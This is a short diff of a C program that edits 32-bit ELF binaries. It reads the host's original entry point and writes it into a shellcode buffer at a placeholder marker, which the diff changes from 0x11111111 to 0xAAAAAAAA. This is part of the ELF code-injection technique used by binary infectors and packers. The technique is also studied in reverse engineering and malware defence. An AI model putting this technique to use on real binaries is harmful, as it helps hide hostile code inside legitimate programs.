@@ -54,13 +54,9 @@ int main (int argc, char *argv[]) {
 	********************************************************************************************************/
 
 	Elf32_Ehdr	*t_ehdr;
-	Elf32_Addr	oep; 
 
 	// get ELF header
 	t_ehdr = (Elf32_Ehdr *) t_addr;
-
-	// get original entry point (oep)
-	oep = t_ehdr->e_entry;
 
 	/********************************************************************************************************
 	|													|							
@@ -204,7 +200,11 @@ int main (int argc, char *argv[]) {
 	
 	Elf32_Addr	*base;
 	Elf32_Phdr 	*t_phdr2 = (Elf32_Phdr *) ((unsigned char *) t_ehdr + (unsigned int) t_ehdr->e_phoff);	
+	Elf32_Addr	oep; 
 
+	// get original entry point (oep)
+	oep = t_ehdr->e_entry;
+	
 	// find base
 	for (i = 0; i < t_ehdr->e_phnum; i++) {
 		if (t_phdr2->p_type == PT_LOAD) {
@@ -226,7 +226,7 @@ int main (int argc, char *argv[]) {
 	
 	for (i = 0; i < sc_size-4; i++) {
 		substr = *(unsigned int *) (sc_ptr + i);
-		if (substr == 0x11111111) {
+		if (substr == 0xAAAAAAAA) {
 			*(unsigned int *) (sc_ptr + i) = oep; 
 			break;
 		}
